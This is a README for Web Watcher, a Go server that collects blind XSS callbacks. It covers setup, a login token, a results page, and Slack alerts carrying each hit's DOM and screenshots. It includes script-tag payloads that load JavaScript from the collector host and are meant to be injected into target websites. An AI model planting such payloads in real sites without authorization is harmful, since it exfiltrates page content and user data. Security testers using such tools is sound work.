# Web Watcher  
Golang server for testing blind XSS.   
Special endpoint for testing requests and file extensions.  

## Setup  
1. Install  
```
git clone https://github.com/pichik/webwatcher
```
2. Build application
```
sudo go build -o /usr/local/bin/webwatcher main.go
```
3. Set permissions for ports 
```
sudo setcap CAP_NET_BIND_SERVICE+ep ~/go/bin/webwatcher
``` 
3. Fill `.wwconfig` and add it to your home directory.  
4. Move web directory to a place specified in config.  
5. Remove the rest.

## Usage
Login to your website with /login?token=[token]  

After authentication, you can find all requests in `/results/all`.  
Left side is from  XSS requests.  
Right side is from custom path requests.  
![results](screenshots/results.png)  


### Collecting simple request data from path you specified in config  
This endpoint will contain response specified in `assets/extensions.json` file  

**Example:**  
Set `"CollectorPath":"examplepath"` in `.wwconfig`  
Set `.js` extension with payload `alert(1)` in `assets/extensions.json`  
Insert this payload to the website, alert will popup.  
`<script src=https://domain.com/examplepath.js></script>`  

### Collecting data from blind XSS  
You can find detailed report for your XSS, with DOM and Screenshort.  
These request will be sent to slack, if specified in config.
`<script src=https://example.com></script>`  
![blind xss](screenshots/blindxss.png)  



